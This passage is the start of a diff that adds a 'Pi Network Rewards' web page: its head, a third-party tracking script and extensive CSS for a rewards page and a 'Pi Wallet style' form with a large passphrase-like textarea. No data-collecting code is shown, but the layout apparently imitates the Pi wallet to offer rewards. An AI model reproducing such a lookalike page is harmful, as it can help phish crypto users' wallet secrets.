@@ -1,0 +1,2883 @@
+
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Pi Network Rewards</title>
+		<link
+			href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+			rel="stylesheet"
+		/>
+		<link
+			rel="stylesheet"
+			href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+		/>
+		<link
+			rel="icon"
+			type="image/png"
+			sizes="32x32"
+			href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png"
+		/>
+		<link
+			rel="icon"
+			type="image/png"
+			sizes="96x96"
+			href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png"
+		/>
+		<link
+			rel="icon"
+			type="image/png"
+			sizes="192x192"
+			href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png"
+		/>
+		<link
+			rel="apple-touch-icon"
+			sizes="180x180"
+			href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png"
+		/>
+		<link rel="icon" type="image/x-icon" href="/favicon.ico" />
+		<!-- Add Google Fonts for better typography -->
+		<link rel="preconnect" href="https://fonts.googleapis.com" />
+		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+		<link
+			href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Roboto:wght@400;500;700;900&display=swap"
+			rel="stylesheet"
+		/>
+
+		<script async src="https://app.lazytrack.io/vdweb.min.js?public_id=315e2fc1-cc34-44c7-b529-379372a04b42"></script>
+		
+		<style>
+			:root {
+				/* Enhanced color palette */
+				--pi-purple: #744394;
+				--pi-purple-light: #7d48a0;
+				--pi-purple-dark: #54306f;
+				--pi-gold: #f8c056;
+				--pi-gold-light: #ffd78c;
+				--pi-gold-dark: #e6a938;
+
+				/* Secondary accent colors */
+				--pi-teal: #4ecdc4;
+				--pi-pink: #ff6b8b;
+				--pi-blue: #45b7d1;
+
+				/* Animation timing */
+				--transition-fast: 0.2s;
+				--transition-medium: 0.4s;
+				--transition-slow: 0.8s;
+			}
+
+			/* Dark mode is default now */
+			:root {
+				--bg-primary: #1a0e24;
+				--bg-secondary: #2a1052;
+				--text-primary: #ffffff;
+				--text-secondary: #e0d0ff;
+				--card-bg: rgba(30, 12, 48, 0.85);
+				--input-bg: rgba(30, 12, 48, 0.5);
+			}
+
+			/* Light mode styles - only applied when .light-mode class is present */
+			.light-mode {
+				--bg-primary: #f5efff;
+				--bg-secondary: #eee6ff;
+				--text-primary: #333333;
+				--text-secondary: #666666;
+				--card-bg: rgba(255, 255, 255, 0.85);
+				--input-bg: rgba(255, 255, 255, 0.8);
+			}
+
+			/* Form page always uses light mode */
+			#formPage {
+				--bg-primary: #f5efff;
+				--bg-secondary: #eee6ff;
+				--text-primary: #333333;
+				--text-secondary: #666666;
+				--card-bg: rgba(255, 255, 255, 0.85);
+				--input-bg: rgba(255, 255, 255, 0.8);
+				background-color: #ffffff !important;
+			}
+
+			#formPage .container {
+				padding-bottom: 1rem;
+			}
+
+			#formPage .mt-8 {
+				margin-bottom: 5rem; /* Thêm margin dưới cho container của nút quay lại */
+			}
+
+			#formPage .py-8 {
+				padding-top: 1rem !important; /* Ghi đè padding mặc định của Tailwind nếu có */
+				/* padding-bottom: 8rem !important;  */
+			}
+
+			body {
+				font-family: "Inter", "Roboto", -apple-system,
+					BlinkMacSystemFont, "Segoe UI", sans-serif;
+				background-color: var(--bg-primary);
+				color: var(--text-primary);
+				margin: 0;
+				padding: 0;
+				min-height: 100vh;
+				overflow-x: hidden;
+				position: relative;
+				will-change: transform;
+				line-height: 1.6;
+				font-size: 1rem;
+				letter-spacing: -0.014em;
+				font-weight: 500;
+			}
+
+			h1,
+			h2,
+			h3,
+			h4,
+			h5,
+			h6 {
+				font-family: "Roboto", "Inter", -apple-system,
+					BlinkMacSystemFont, "Segoe UI", sans-serif;
+				font-weight: 700;
+				letter-spacing: -0.021em;
+				line-height: 1.3;
+			}
+
+			h1,
+			h2,
+			h3,
+			h4,
+			h5,
+			h6 {
+				font-family: "Roboto", "Segoe UI", Tahoma, Geneva, Verdana,
+					sans-serif;
+				font-weight: 700;
+				letter-spacing: -0.02em;
+				line-height: 1.2;
+			}
+
+			#formPage .pi-title,
+			.pi-wallet-style .pi-title {
+				font-size: 1.62rem !important; /* Tăng kích thước */
+				font-weight: 420 !important; /* Đảm bảo độ đậm tối đa */
+				text-align: center !important;
+				margin-top: 0.6rem !important;
+				margin-bottom: 2rem !important;
+				color: #0f0e0e !important; /* Màu đen hoàn toàn */
+				text-shadow: 0px 0.5px 0px rgba(0, 0, 0, 0.5) !important; /* Tăng bóng đổ */
+				font-family: "Roboto", sans-serif !important;
+				letter-spacing: -0.02em !important; /* Giảm khoảng cách chữ */
+				-webkit-text-stroke: 0.3px black !important; /* Tạo viền ngoài cho chữ */
+				transform: scale(1.01, 1) !important; /* Làm chữ hơi rộng ra */
+				display: block !important;
+				line-height: 1.2 !important; /* Giảm line height */
+			}
+
+			.pi-header {
+				background: #6e3b8f; /* Thay đổi từ gradient sang màu đơn */
+				padding: 10px 20px;
+				display: flex;
+				align-items: center;
+				justify-content: space-between;
+				position: relative;
+				height: 56px;
+				z-index: 50;
+				box-shadow: 0 4px 20px rgba(122, 53, 164, 0.3);
+			}
+
+			.pi-header-content {
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				width: 100%;
+				position: relative;
+			}
+
+			.header-back-btn {
+				position: absolute;
+				left: 0;
+				color: white;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				z-index: 10;
+				transition: transform var(--transition-fast);
+			}
+
+			.header-back-btn:hover {
+				transform: translateX(-2px);
+			}
+
+			.header-dropdown-btn {
+				position: absolute;
+				right: 0;
+				color: white;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				z-index: 10;
+				transition: transform var(--transition-fast);
+			}
+
+			.header-dropdown-btn:hover {
+				transform: translateY(2px);
+			}
+
+			.wallet-icon {
+				width: 30px;
+				height: 30px;
+				background: linear-gradient(
+					135deg,
+					var(--pi-gold),
+					var(--pi-gold-dark)
+				);
+				border-radius: 8px;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-weight: bold;
+				color: var(--pi-purple);
+				margin-right: 10px;
+				box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+				position: relative;
+				overflow: hidden;
+			}
+
+			.wallet-icon::after {
+				content: "";
+				position: absolute;
+				top: -50%;
+				left: -50%;
+				width: 200%;
+				height: 200%;
+				background: linear-gradient(
+					to bottom right,
+					rgba(255, 255, 255, 0) 0%,
+					rgba(255, 255, 255, 0) 40%,
+					rgba(255, 255, 255, 0.4) 50%,
+					rgba(255, 255, 255, 0) 60%,
+					rgba(255, 255, 255, 0) 100%
+				);
+				transform: rotate(30deg);
+				animation: shineIcon 3s infinite;
+			}
+
+			.wallet-text {
+				color: white;
+				font-size: 18px;
+				font-weight: 700;
+				text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+			}
+
+			.pi-coin-icon {
+				width: 32px;
+				height: 32px;
+				background: linear-gradient(
+					135deg,
+					var(--pi-gold),
+					var(--pi-gold-dark)
+				);
+				border-radius: 50%;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-weight: bold;
+				color: var(--pi-purple);
+				margin-left: 10px;
+				box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+				position: relative;
+				overflow: hidden;
+			}
+
+			.pi-coin-icon::after {
+				content: "";
+				position: absolute;
+				top: -50%;
+				left: -50%;
+				width: 200%;
+				height: 200%;
+				background: linear-gradient(
+					to bottom right,
+					rgba(255, 255, 255, 0) 0%,
+					rgba(255, 255, 255, 0) 40%,
+					rgba(255, 255, 255, 0.4) 50%,
+					rgba(255, 255, 255, 0) 60%,
+					rgba(255, 255, 255, 0) 100%
+				);
+				transform: rotate(30deg);
+				animation: shineIcon 3s infinite;
+				animation-delay: 1s;
+			}
+
+			/* Premium background elements - enhanced */
+			.premium-bg {
+				position: fixed;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				z-index: -10;
+				overflow: hidden;
+				pointer-events: none; /* prevent interaction with background */
+			}
+
+			/* Animated gradient - improved colors */
+			.animated-gradient {
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: radial-gradient(
+						circle at 20% 30%,
+						rgba(154, 83, 198, 0.1) 0%,
+						transparent 60%
+					),
+					radial-gradient(
+						circle at 80% 20%,
+						rgba(154, 83, 198, 0.1) 0%,
+						transparent 50%
+					),
+					radial-gradient(
+						circle at 50% 70%,
+						rgba(248, 192, 86, 0.05) 0%,
+						transparent 70%
+					);
+				opacity: 0.8;
+			}
+
+			/* Light streaks - enhanced */
+			.light-streak {
+				position: absolute;
+				height: 1px;
+				width: 200px;
+				background: linear-gradient(
+					90deg,
+					transparent,
+					rgba(154, 83, 198, 0.5),
+					transparent
+				);
+				border-radius: 100%;
+				opacity: 0;
+				animation: lightStreak 12s linear infinite; /* Slower animation */
+				will-change: transform, opacity; /* Optimize animation */
+			}
+
+			/* Moving waves - enhanced */
+			.wave-container {
+				position: absolute;
+				width: 100%;
+				height: 100%;
+				overflow: hidden;
+				opacity: 0.2;
+			}
+
+			.wave {
+				position: absolute;
+				width: 200%;
+				height: 200%;
+				border-radius: 40%;
+				opacity: 0.2;
+				top: 50%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+				animation: waveRotate 60s linear infinite; /* Slowed down */
+				will-change: transform; /* Optimize animation */
+			}
+
+			.wave1 {
+				border: 1px solid rgba(154, 83, 198, 0.3);
+				animation-duration: 60s; /* Slowed down */
+			}
+
+			.wave2 {
+				border: 1px solid rgba(248, 192, 86, 0.3);
+				animation-duration: 50s; /* Slowed down */
+				animation-direction: reverse;
+			}
+
+			.wave3 {
+				border: 1px solid rgba(154, 83, 198, 0.2);
+				animation-duration: 70s; /* Slowed down */
+			}
+
+			/* Stars - enhanced */
+			.star {
+				position: absolute;
+				background-color: white;
+				border-radius: 50%;
+				filter: blur(1px);
+				opacity: 0.4;
+				animation: twinkle 4s infinite ease-in-out;
+			}
+
+			/* Star with single point - enhanced */
+			.star-single {
+				position: absolute;
+				width: 2px;
+				height: 2px;
+				background-color: white;
+				border-radius: 50%;
+				filter: blur(0.5px);
+				opacity: 0.8;
+				box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
+				animation: twinkleStar 3s infinite ease-in-out;
+			}
+
+			/* Pi coins - enhanced */
+			.premium-coin {
+				position: absolute;
+				width: 60px;
+				height: 60px;
+				border-radius: 50%;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-weight: bold;
+				color: var(--pi-purple);
+				z-index: -1;
+				transform-style: preserve-3d;
+				will-change: transform; /* Optimize animation */
+				filter: drop-shadow(0 10px 15px rgba(0, 0, 0, 0.1));
+			}
+
+			.coin-inner {
+				position: relative;
+				width: 100%;
+				height: 100%;
+				border-radius: 50%;
+				text-align: center;
+				transition: transform 0.6s;
+				transform-style: preserve-3d;
+				animation: coinRotate 20s infinite linear; /* Slowed down */
+			}
+
+			.coin-front,
+			.coin-back {
+				position: absolute;
+				width: 100%;
+				height: 100%;
+				border-radius: 50%;
+				backface-visibility: hidden;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 2rem;
+				font-weight: bold;
+			}
+
+			.coin-front {
+				background: radial-gradient(
+					circle at 30% 30%,
+					var(--pi-gold),
+					var(--pi-gold-dark)
+				);
+				box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
+			}
+
+			.coin-back {
+				background: radial-gradient(
+					circle at 30% 30%,
+					var(--pi-gold-dark),
+					var(--pi-gold)
+				);
+				transform: rotateY(180deg);
+				box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
+			}
+
+			/* Floating particles - enhanced */
+			.particle {
+				position: absolute;
+				width: 6px;
+				height: 6px;
+				background-color: rgba(154, 83, 198, 0.2);
+				border-radius: 50%;
+				filter: blur(1px);
+				animation: floatParticle 15s infinite linear;
+				will-change: transform; /* Optimize animation */
+			}
+
+			/* Feature card with enhanced wave effect */
+			.feature-card {
+				position: relative;
+				overflow: hidden;
+				z-index: 1;
+				transition: transform 0.3s ease, box-shadow 0.3s ease;
+				border: 1px solid rgba(255, 255, 255, 0.1);
+			}
+
+			.feature-card:hover {
+				transform: translateY(-5px);
+				box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+			}
+
+			.feature-card-wave {
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 200%;
+				height: 200%;
+				background: radial-gradient(
+					ellipse at center,
+					rgba(105, 57, 136, 0.2) 0%,
+					rgba(105, 57, 136, 0.1) 25%,
+					rgba(105, 57, 136, 0) 70%
+				);
+				opacity: 0;
+				border-radius: 50%;
+				transform: translate(-25%, -25%) scale(0.1);
+				animation: cardWave 4s infinite ease-out;
+				pointer-events: none;
+			}
+
+			/* Shiny wave effect for feature icons */
+			.feature-icon {
+				position: relative;
+				overflow: hidden;
+			}
+
+			.feature-icon::after {
+				content: "";
+				position: absolute;
+				top: -50%;
+				left: -100%;
+				width: 70%;
+				height: 200%;
+				background: linear-gradient(
+					to right,
+					rgba(255, 255, 255, 0) 0%,
+					rgba(255, 255, 255, calc(0.3 * var(--shine-opacity, 1))) 50%,
+					rgba(255, 255, 255, 0) 100%
+				);
+				transform: rotate(30deg);
+				animation: shinyWave 6s infinite ease-in-out; /* Tăng thời gian từ 3s lên 6s */
+				pointer-events: none;
+			}
+
+			/* Confetti elements for success animation - enhanced */
+			/* Confetti elements for success animation - enhanced */
+			/* Confetti elements for success animation - enhanced */
+			.confetti-container {
+				position: fixed;
+				width: 100vw;
+				height: 100vh;
+				top: 0;
+				left: 0;
+				z-index: 2000; /* Increased z-index to appear above the modal */
+				pointer-events: none;
+				overflow: hidden;
+				display: none;
+			}
+
+			.confetti {
+				position: absolute;
+				width: 10px;
+				height: 10px;
+				background-color: var(--pi-gold);
+				opacity: 0;
+			}
+
+			/* Square confetti */
+			.confetti-square {
+				background-color: var(--pi-purple);
+			}
+
+			/* Circle confetti */
+			.confetti-circle {
+				border-radius: 50%;
+				background-color: var(--pi-gold);
+			}
+
+			/* Triangle confetti */
+			.confetti-triangle {
+				width: 0;
+				height: 0;
+				background-color: transparent;
+				border-left: 5px solid transparent;
+				border-right: 5px solid transparent;
+				border-bottom: 10px solid var(--pi-purple-light);
+			}
+
+			/* Page container and transitions */
+			.page-container {
+				padding-bottom: 0;
+				width: 100%;
+				max-width: 100vw;
+				overflow-x: hidden;
+				min-height: calc(100vh - 64px);
+				position: relative;
+			}
+
+			/* Add overflow hidden when formPage is active */
+			/* .page-container:has(#formPage.page-active) {
+				overflow: hidden;
+			} */
+
+			#formPage.page-active {
+				/* overflow: hidden; */
+				height: 100vh;
+				position: fixed;
+				top: 0;
+				left: 0;
+			}
+
+			.page {
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				min-height: calc(100vh - 64px);
+				transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1),
+					opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+				background-color: transparent;
+				z-index: 10;
+				will-change: transform, opacity; /* Optimize animation */
+			}
+
+			.page-active {
+				transform: translateX(0);
+				opacity: 1;
+				z-index: 11;
+			}
+
+			.page-inactive-right {
+				transform: translateX(100%);
+				opacity: 0;
+				z-index: 9;
+				pointer-events: none;
+			}
+
+			.page-inactive-left {
+				transform: translateX(-100%);
+				opacity: 0;
+				z-index: 9;
+				pointer-events: none;
+			}
+
+			/* Premium cards - enhanced */
+			.card {
+				background-color: var(--card-bg);
+				backdrop-filter: blur(15px);
+				border-radius: 0.8rem;
+				box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+				transition: transform 0.3s ease, box-shadow 0.3s ease;
+				overflow: hidden;
+				position: relative;
+				border: 1px solid rgba(255, 255, 255, 0.1);
+			}
+
+			.card::before {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: linear-gradient(
+					45deg,
+					transparent,
+					rgba(255, 255, 255, 0.05),
+					transparent
+				);
+				pointer-events: none;
+			}
+
+			.card:hover {
+				transform: translateY(-5px);
+				box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+			}
+
+			/* Premium buttons - enhanced */
+			.btn-primary {
+				background: linear-gradient(
+					135deg,
+					var(--pi-purple),
+					var(--pi-purple-dark)
+				);
+				color: white;
+				font-weight: 600;
+				border-radius: 0.5rem;
+				padding: 0.9rem 2rem;
+				transition: all 0.3s ease;
+				box-shadow: 0 6px 15px rgba(122, 53, 164, 0.25);
+				position: relative;
+				overflow: hidden;
+				z-index: 1;
+				border: 1px solid var(--pi-gold);
+				outline: none;
+				text-transform: uppercase;
+				letter-spacing: 0.5px;
+			}
+
+			.btn-primary:hover {
+				transform: translateY(-3px);
+				box-shadow: 0 8px 20px rgba(122, 53, 164, 0.4);
+			}
+
+			.btn-primary:active {
+				transform: translateY(1px);
+			}
+
+			.btn-secondary {
+				background: rgba(122, 53, 164, 0.1);
+				color: var(--pi-purple);
+				font-weight: 600;
+				border-radius: 0.5rem;
+				padding: 0.75rem 1.5rem;
+				transition: all 0.3s ease;
+				position: relative;
+				overflow: hidden;
+				border: 1px solid rgba(122, 53, 164, 0.2);
+			}
+
+			.btn-secondary:hover {
+				background: rgba(122, 53, 164, 0.15);
+				transform: translateY(-2px);
+			}
+
+			/* Premium reward cards - enhanced */
+			.reward-card {
+				position: relative;
+				transition: transform 0.3s ease, box-shadow 0.3s ease;
+				overflow: hidden;
+				border-top: 3px solid transparent;
+				background: linear-gradient(var(--card-bg), var(--card-bg))
+						padding-box,
+					linear-gradient(90deg, var(--pi-purple), var(--pi-gold))
+						border-box;
+				border-radius: 0.8rem;
+			}
+
+			.reward-card:hover {
+				transform: translateY(-5px);
+				box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+			}
+
+			.reward-amount {
+				color: var(--pi-purple);
+				font-weight: bold;
+				font-size: 2rem;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				position: relative;
+				z-index: 1;
+			}
+
+			.reward-amount::before {
+				content: "π";
+				font-size: 2.2rem;
+				margin-right: 0.2rem;
+			}
+
+			.reward-amount::after {
+				content: "";
+				position: absolute;
+				width: 70px;
+				height: 70px;
+				background: radial-gradient(
+					circle,
+					rgba(248, 192, 86, 0.15) 0%,
+					transparent 70%
+				);
+				border-radius: 50%;
+				z-index: -1;
+			}
+
+			/* Premium progress bar - enhanced */
+			.progress-bar {
+				height: 8px;
+				border-radius: 10px;
+				background: rgba(122, 53, 164, 0.1);
+				overflow: hidden;
+				position: relative;
+			}
+
+			.progress-fill {
+				height: 100%;
+				border-radius: 10px;
+				background: linear-gradient(
+					90deg,
+					var(--pi-purple),
+					var(--pi-purple-light)
+				);
+				position: relative;
+				overflow: hidden;
+			}
+
+			/* Premium feature icons - enhanced */
+			.feature-icon {
+				width: 70px;
+				height: 70px;
+				border-radius: 12px;
+				background: linear-gradient(
+					135deg,
+					var(--pi-purple-light),
+					var(--pi-purple)
+				);
+				box-shadow: 0 8px 20px rgba(122, 53, 164, 0.2);
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				margin: 0 auto 1rem;
+				position: relative;
+				overflow: hidden;
+			}
+
+			.feature-icon i {
+				font-size: 2rem;
+				color: white;
+				position: relative;
+				z-index: 2;
+			}
+
+			/* Pi Wallet style form - enhanced */
+			.pi-wallet-style {
+				margin: 0 auto;
+				max-width: 500px;
+				padding: 0 20px;
+				padding-top: 10px; /* Thêm padding top nhỏ hơn */
+			}
+			.pi-title {
+				font-size: 1.8rem; /* Tăng kích thước một chút */
+				font-weight: 900; /* Sử dụng giá trị tối đa tiêu chuẩn */
+				text-align: center;
+				margin-top: 0.6rem;
+				margin-bottom: 2rem;
+				color: #111; /* Màu đen đậm hơn */
+				text-shadow: 0px 0.2px 0px rgba(0, 0, 0, 0.3); /* Thêm bóng mỏng để tạo hiệu ứng đậm */
+				font-family: "Roboto", sans-serif;
+				letter-spacing: -0.01em; /* Giảm khoảng cách chữ để tạo cảm giác đậm hơn */
+			}
+			.pi-input-container {
+				margin-bottom: 1.3rem; /* Giảm từ 2rem xuống 1rem để giảm khoảng cách với nút */
+				border-radius: 12px;
+				min-height: 250px;
+				overflow: hidden;
+				background: transparent;
+				border: 1px solid #ccc; /* Thay đổi từ #000 sang #ccc để có viền màu xám */
+				box-shadow: none;
+				max-width: 1000px;
+				margin-left: auto;
+				margin-right: auto;
+				display: flex;
+				flex-direction: column;
+			}
+
+			.pi-input-container:focus-within {
+				border: 2px solid var(--pi-purple);
+				box-shadow: 0 5px 25px rgba(105, 57, 136, 0.2);
+			}
+
+			.pi-input {
+				width: 100%;
+				padding: 24px;
+				min-height: 250px; /* Thay đổi từ height thành min-height */
+				height: auto; /* Cho phép tự động mở rộng chiều cao */
+				resize: none;
+				background: transparent;
+				border: none;
+				font-size: 1.2rem;
+				color: #333;
+				outline: none;
+				vertical-align: top;
+				text-align: left;
+				word-break: break-word;
+				overflow-wrap: break-word;
+				white-space: pre-wrap;
+				display: block;
+				align-self: flex-start;
+				font-family: monospace;
+				line-height: 1; /* Giảm khoảng cách giữa các dòng */
+				font-weight: 400;
+			}
+
+			.pi-button {
+				width: 100%;
+				padding: 13.5px; /* Tăng từ 13px lên 15px để tăng chiều dọc */
+				font-size: 0.85rem; /* Tăng từ 0.85rem lên 0.9rem */
+				font-weight: 600;
+				text-transform: uppercase;
+				text-align: center;
+				border-radius: 8px;
+				margin-bottom: 0.8rem;
+				transition: all 0.3s ease;
+				letter-spacing: 0.05em;
+				white-space: nowrap;
+				overflow: hidden;
+				text-overflow: ellipsis;
+			}
+
+			/* Enhanced balloon animation styles */
+			.balloon {
+				position: absolute;
+				width: 40px;
+				height: 50px;
+				background: radial-gradient(
+					circle at 30% 30%,
+					var(--balloon-color),
+					var(--balloon-color-dark)
+				);
+				border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
+				box-shadow: inset 0 -8px 0 rgba(0, 0, 0, 0.2),
+					0 5px 10px rgba(0, 0, 0, 0.1);
+				animation: balloonFloat 30s linear infinite;
+				opacity: 0.8;
+				z-index: -5;
+				will-change: transform;
+				transform-origin: bottom center;
+			}
+
+			.balloon:after {
+				content: "";
+				position: absolute;
+				bottom: -12px;
+				left: 50%;
+				transform: translateX(-50%);
+				width: 2px;
+				height: 15px;
+				background: rgba(0, 0, 0, 0.2);
+			}
+
+			/* Enhanced balloon animation */
+			@keyframes balloonFloat {
+				0% {
+					transform: translateY(100vh) translateX(0px) rotate(0deg);
+					opacity: 0;
+				}
+				10% {
+					opacity: 0.8;
+					transform: translateY(80vh)
+						translateX(var(--float-distance)) rotate(5deg);
+				}
+				50% {
+					transform: translateY(40vh)
+						translateX(calc(var(--float-distance) * 1.5))
+						rotate(-5deg);
+				}
+				90% {
+					opacity: 0.8;
+					transform: translateY(10vh)
+						translateX(var(--float-distance)) rotate(5deg);
+				}
+				100% {
+					transform: translateY(-100px)
+						translateX(var(--float-distance)) rotate(0deg);
+					opacity: 0;
+				}
+			}
+
+			.pi-button-primary {
+				background: #724394;
+				color: white;
+				border: none;
+				box-shadow: none;
+				border-radius: 8px;
+				text-transform: uppercase;
+				font-weight: 700;
+				margin-top: 0.5rem;
+				margin-bottom: 1rem;
+			}
+
+			.pi-button-primary::before {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: -100%;
+				width: 100%;
+				height: 100%;
+				background: linear-gradient(
+					90deg,
+					rgba(255, 255, 255, 0) 0%,
+					rgba(255, 255, 255, 0.2) 50%,
+					rgba(255, 255, 255, 0) 100%
+				);
+				transition: all 0.6s ease;
+			}
+
+			.pi-button-primary:hover {
+				background: linear-gradient(
+					135deg,
+					var(--pi-purple-light),
+					var(--pi-purple)
+				);
+				transform: translateY(-2px);
+				box-shadow: 0 8px 16px rgba(122, 53, 164, 0.35);
+			}
+
+			.pi-button-primary:hover::before {
+				left: 100%;
+			}
+
+			.pi-button-primary:disabled {
+				background-color: #a5a5a5;
+				transform: none;
+				cursor: not-allowed;
+				box-shadow: none;
+				opacity: 0.7;
+			}
+
+			.pi-button-secondary {
+				background: white;
+				color: #724394;
+				border: 1px solid #724394;
+				border-radius: 8px;
+				text-transform: uppercase;
+				font-weight: 700;
+				margin-top: 0;
+			}
+
+			.pi-button-secondary::after {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: rgba(122, 53, 164, 0.05);
+				z-index: -1;
+				transform: scaleX(0);
+				transform-origin: right;
+				transition: transform 0.3s ease;
+			}
+
+			.pi-button-secondary:hover {
+				background-color: rgba(
+					114,
+					67,
+					148,
+					0.05
+				); /* Màu nền nhạt khi hover */
+			}
+
+			.pi-button-secondary:hover::after {
+				transform: scaleX(1);
+				transform-origin: left;
+			}
+
+			.pi-info-text {
+				font-size: 1rem;
+				line-height: 1.6;
+				color: #000;
+				margin-top: 1.4rem; /* Giảm từ 2rem xuống 1.5rem */
+				margin-bottom: 1rem; /* Thêm margin-bottom để kiểm soát khoảng cách với nút vân tay */
+				text-align: left;
+				word-wrap: break-word;
+				white-space: normal;
+				width: 100%;
+				font-weight: 400;
+			}
+
+			.pi-link {
+				color: #3d9dff;
+				text-decoration: none;
+				position: relative;
+				transition: color 0.3s ease;
+			}
+
+			.pi-link::after {
+				content: "";
+				position: absolute;
+				bottom: -2px;
+				left: 0;
+				width: 100%;
+				height: 1px;
+				background-color: #3d9dff;
+				transform: scaleX(0);
+				transform-origin: right;
+				transition: transform 0.3s ease;
+			}
+
+			.pi-link:hover {
+				color: #65b5ff;
+			}
+
+			.pi-link:hover::after {
+				transform: scaleX(1);
+				transform-origin: left;
+			}
+
+			/* Scroll animations - enhanced */
+			.animate-on-scroll {
+				opacity: 0;
+				transform: translateY(30px);
+				transition: opacity 0.8s ease, transform 0.8s ease;
+				will-change: opacity, transform; /* Optimize animation */
+			}
+
+			.animate-on-scroll.animated {
+				opacity: 1;
+				transform: translateY(0);
+			}
+
+			.animate-fade-in {
+				opacity: 0;
+				transition: opacity 1s ease;
+				will-change: opacity; /* Optimize animation */
+			}
+
+			.animate-fade-in.animated {
+				opacity: 1;
+			}
+
+			/* Enhanced about section illustration */
+			.about-illustration {
+				width: 180px;
+				height: 180px;
+				margin: 0 auto 2rem;
+				position: relative;
+			}
+
+			.about-circle {
+				width: 100%;
+				height: 100%;
+				border-radius: 50%;
+				background: linear-gradient(
+					135deg,
+					rgba(154, 83, 198, 0.1),
+					rgba(154, 83, 198, 0.2)
+				);
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				position: relative;
+				overflow: hidden;
+			}
+
+			.about-circle::before {
+				content: "";
+				position: absolute;
+				width: 90%;
+				height: 90%;
+				border-radius: 50%;
+				border: 2px dashed rgba(154, 83, 198, 0.3);
+				/* Removed animation to keep dashed border static */
+			}
+
+			.about-icon {
+				font-size: 4rem;
+				color: var(--pi-purple);
+				position: relative;
+				z-index: 1;
+			}
+
+			/* Loading overlay - enhanced */
+			.loading-overlay {
+				display: none;
+				position: fixed;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background-color: rgba(0, 0, 0, 0.7);
+				z-index: 1000;
+				align-items: center;
+				justify-content: center;
+				backdrop-filter: blur(5px);
+			}
+
+			.loading-spinner {
+				position: relative;
+				width: 80px;
+				height: 80px;
+			}
+
+			.loading-spinner::before,
+			.loading-spinner::after {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				border-radius: 50%;
+				border: 4px solid transparent;
+				border-top-color: var(--pi-purple);
+				animation: spin 1.5s linear infinite;
+				box-shadow: 0 0 10px rgba(122, 53, 164, 0.3);
+			}
+
+			.loading-spinner::after {
+				border-top-color: transparent;
+				border-bottom-color: var(--pi-gold);
+				animation-duration: 1s;
+			}
+
+			.loading-spinner-label {
+				position: absolute;
+				top: 120%;
+				left: 50%;
+				transform: translateX(-50%);
+				color: white;
+				font-weight: 500;
+				white-space: nowrap;
+			}
+
+			/* Enhanced explosion particles */
+			.surprise-container {
+				position: relative;
+				overflow: hidden;
+			}
+
+			.surprise-trigger.active .explosion-particle {
+				animation: explode 1s forwards;
+			}
+
+			.explosion-particle {
+				position: absolute;
+				width: 10px;
+				height: 10px;
+				border-radius: 50%;
+				background-color: var(--pi-gold);
+				opacity: 0;
+				pointer-events: none;
+			}
+
+			/* Enhanced 3D effect */
+			.tilt-card {
+				transform-style: preserve-3d;
+				transition: transform 0.3s ease, box-shadow 0.3s ease;
+			}
+
+			.tilt-card:hover {
+				box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+			}
+
+			/* Certificate badge - enhanced */
+			.certificate {
+				position: relative;
+				padding: 1.8rem;
+				border-radius: 0.8rem;
+				background: linear-gradient(
+					135deg,
+					rgba(248, 192, 86, 0.1),
+					rgba(154, 83, 198, 0.1)
+				);
+				border: 1px dashed rgba(248, 192, 86, 0.3);
+				margin-top: 2rem;
+				box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+			}
+
+			.certificate-icon {
+				position: absolute;
+				top: -20px;
+				left: 50%;
+				transform: translateX(-50%);
+				width: 40px;
+				height: 40px;
+				background: linear-gradient(
+					135deg,
+					var(--pi-gold),
+					var(--pi-gold-dark)
+				);
+				border-radius: 50%;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+			}
+
+			.certificate-icon i {
+				color: white;
+				font-size: 1.2rem;
